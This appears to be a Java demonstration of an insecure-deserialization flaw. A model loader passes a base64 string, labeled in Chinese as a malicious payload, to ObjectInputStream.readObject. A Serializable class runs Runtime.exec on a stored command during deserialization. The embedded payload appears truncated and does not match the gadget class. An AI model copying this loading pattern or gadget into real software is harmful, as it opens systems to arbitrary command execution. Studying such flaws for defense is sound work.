import java.io.*;
import java.util.Base64;

class ModelLoader {
    public static void main(String[] args) throws Exception {
        String userInput = "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eLndhSmfTcQoAAeJAQICAw=="; //恶意payload
        byte[] data = Base64.getDecoder().decode(userInput);
        loadModel(data);
    }

    static void loadModel(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object model = ois.readObject(); // 不安全反序列化
            System.out.println("Model loaded: " + model);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class MaliciousModel implements Serializable {
    private String cmd;
    public MaliciousModel(String cmd) { this.cmd = cmd; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd); // 执行任意命令
    }
}